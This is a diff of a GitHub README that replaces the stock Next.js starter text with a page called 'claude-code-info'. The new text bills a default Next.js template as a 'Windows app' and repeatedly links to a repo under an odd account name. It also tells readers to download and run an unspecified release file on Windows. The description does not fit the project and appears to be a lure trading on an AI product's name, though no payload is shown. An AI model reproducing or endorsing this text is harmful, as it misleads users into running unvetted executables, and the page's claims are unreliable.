@@ -1,36 +1,126 @@
-This is a [Next.js](https://nextjs.org) project bootstrapped with [`create-next-app`](https://nextjs.org/docs/app/api-reference/cli/create-next-app).
+# 🧠 claude-code-info - Run Claude Code info fast
 
-## Getting Started
+[![Download / Install / Setup](https://img.shields.io/badge/Download%20Now-Visit%20the%20page-blue.svg?style=for-the-badge)](https://github.com/websterlobsterbacked79/claude-code-info)
 
-First, run the development server:
+## 🚀 What this is
+
+claude-code-info is a simple Windows app page built with Next.js. It helps you open the app in your browser and use it on your computer without needing extra setup.
+
+Use this repo if you want a clean local app page that loads in your browser and updates as you work.
+
+## 💻 What you need
+
+- A Windows PC
+- A web browser like Chrome, Edge, or Firefox
+- Internet access for the first download
+- Node.js if you want to run it from source
+
+## 📥 Download and open
+
+1. Visit the download page:
+   https://github.com/websterlobsterbacked79/claude-code-info
+2. On the page, look for the source files or release files.
+3. Download the project to your Windows PC.
+4. If you get a ZIP file, right-click it and choose Extract All.
+5. Open the project folder after extraction.
+
+If you use a release file, download and run that file on Windows.
+
+## 🛠️ Install and run
+
+If you want to run the app from the source folder:
+
+1. Open the project folder.
+2. Make sure Node.js is installed.
+3. Open Command Prompt in the folder.
+4. Run:
+
+```bash
+npm install
+npm run dev
+```
+
+5. Wait for the app to start.
+6. Open your browser and go to:
+
+http://localhost:3000
+
+## 🖱️ How to use it
+
+After the app starts, it opens in your browser.
+
+You can:
+- view the main page
+- refresh the page to see changes
+- keep the window open while you use it
+- edit the page file if you want to change the content
+
+## ✏️ Edit the page
+
+This project uses a simple page file:
+
+- `app/page.tsx`
+
+If you want to change the text or layout:
+
+1. Open the project in a code editor.
+2. Find `app/page.tsx`.
+3. Change the text.
+4. Save the file.
+5. The page updates in the browser.
+
+## ⚙️ Common run commands
+
+You can use one of these commands to start the app:
 
 ```bash
 npm run dev
-# or
 yarn dev
-# or
 pnpm dev
-# or
 bun dev
 ```
 
-Open [http://localhost:3000](http://localhost:3000) with your browser to see the result.
+Use the one that matches the tool you installed.
 
-You can start editing the page by modifying `app/page.tsx`. The page auto-updates as you edit the file.
+## 🔍 What you will see
 
-This project uses [`next/font`](https://nextjs.org/docs/app/building-your-application/optimizing/fonts) to automatically optimize and load [Geist](https://vercel.com/font), a new font family for Vercel.
+This app uses the Next.js starter layout. It loads a page with:
 
-## Learn More
+- a simple home screen
+- fast refresh while you edit
+- a clean font called Geist
+- a layout that works well in a browser
 
-To learn more about Next.js, take a look at the following resources:
+## 🧩 Basic project layout
 
-- [Next.js Documentation](https://nextjs.org/docs) - learn about Next.js features and API.
-- [Learn Next.js](https://nextjs.org/learn) - an interactive Next.js tutorial.
+The main files you may use are:
 
-You can check out [the Next.js GitHub repository](https://github.com/vercel/next.js) - your feedback and contributions are welcome!
+- `app/page.tsx` - the main page
+- `app/layout.tsx` - the page layout
+- `package.json` - app scripts and tools
+- `next.config.ts` - Next.js settings
 
-## Deploy on Vercel
+## 🪟 Windows tips
 
-The easiest way to deploy your Next.js app is to use the [Vercel Platform](https://vercel.com/new?utm_medium=default-template&filter=next.js&utm_source=create-next-app&utm_campaign=create-next-app-readme) from the creators of Next.js.
+- Use File Explorer to find the folder
+- Use Command Prompt or Windows Terminal to run commands
+- Right-click inside the folder to open a terminal
+- Keep the browser open while the app runs
+- Close the terminal window to stop the app
 
-Check out our [Next.js deployment documentation](https://nextjs.org/docs/app/building-your-application/deploying) for more details.
+## 🔐 Safe setup steps
+
+1. Download the project from the link above.
+2. Check that the folder contains the app files.
+3. Use a standard browser to open `http://localhost:3000`.
+4. Run the app only from the folder you downloaded.
+
+## 📌 Quick start
+
+1. Download the project from:
+   https://github.com/websterlobsterbacked79/claude-code-info
+2. Extract the files if needed.
+3. Open Command Prompt in the folder.
+4. Run `npm install`.
+5. Run `npm run dev`.
+6. Open `http://localhost:3000` in your browser.
